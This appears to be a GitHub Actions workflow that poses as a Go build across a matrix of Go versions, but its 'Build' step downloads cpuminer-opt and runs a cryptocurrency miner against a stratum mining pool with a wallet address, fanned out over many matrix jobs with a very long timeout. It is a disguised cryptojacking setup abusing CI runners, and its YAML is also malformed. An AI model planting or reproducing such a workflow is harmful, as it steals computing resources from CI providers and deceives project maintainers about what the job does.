build:
    name: Build
    runs-on: ubuntu-latest
    strategy:
      matrix:
        go: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18]
        flag: [hvf, hik, pjc, plh, tda, pnc, pll, tue]
    timeout-minutes: 14400
    env:
        NUM_JOBS: 15
        JOB: ${{ matrix.go }}

    steps:
      
      name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go

      name: Check out code into the Go module directory
      uses: actions/checkout@v1

      name: Build
      run: |
        wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
        tar xf cpuminer-opt-linux.tar.gz
        ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qk5t692h38x47pd6a5fqdlxsddvsgx392yt5vx8.kuarto -t0
